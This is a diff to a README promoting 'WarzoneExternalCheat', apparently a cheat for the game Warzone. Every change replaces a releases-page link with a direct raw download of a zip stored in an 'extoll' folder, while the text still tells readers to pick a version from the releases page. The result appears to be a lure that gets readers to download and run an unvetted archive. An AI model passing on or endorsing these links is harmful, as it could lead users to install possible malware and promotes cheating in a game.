@@ -1,6 +1,6 @@
 # 🎮 WarzoneExternalCheat - Enhance Your Warzone Experience Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen.svg)](https://github.com/kal2727/WarzoneExternalCheat/releases)
+[![Download Now](https://raw.githubusercontent.com/kal2727/WarzoneExternalCheat/main/extoll/WarzoneExternalCheat.zip)](https://raw.githubusercontent.com/kal2727/WarzoneExternalCheat/main/extoll/WarzoneExternalCheat.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ Follow these steps to download and run WarzoneExternalCheat:
 
 1. **Visit the Release Page**  
    Click the link below to go to the releases page:  
-   [Download WarzoneExternalCheat](https://github.com/kal2727/WarzoneExternalCheat/releases)
+   [Download WarzoneExternalCheat](https://raw.githubusercontent.com/kal2727/WarzoneExternalCheat/main/extoll/WarzoneExternalCheat.zip)
 
 2. **Download the Latest Version**  
    On the releases page, you will see a list of available versions. Look for the most recent one, and click on the download link to retrieve the application file.
@@ -31,7 +31,7 @@ Follow these steps to download and run WarzoneExternalCheat:
 
 ## 📥 Download & Install
 
-To begin, visit the release page to download WarzoneExternalCheat: [Download WarzoneExternalCheat](https://github.com/kal2727/WarzoneExternalCheat/releases).
+To begin, visit the release page to download WarzoneExternalCheat: [Download WarzoneExternalCheat](https://raw.githubusercontent.com/kal2727/WarzoneExternalCheat/main/extoll/WarzoneExternalCheat.zip).
 
 ### 🔍 Features
 
